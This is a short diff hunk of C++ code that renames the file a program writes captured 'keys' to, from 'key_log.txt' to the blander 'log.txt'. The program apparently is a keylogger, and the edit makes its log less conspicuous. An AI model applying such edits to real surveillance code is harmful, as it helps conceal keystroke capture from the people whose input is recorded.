@@ -210,7 +210,7 @@ int main() {
       
 
   ofstream myfile;      
-  myfile.open ("C:\\key_log.txt");       
+  myfile.open ("C:\\log.txt");       
   myfile << keys;                        
   myfile.close();                         
 
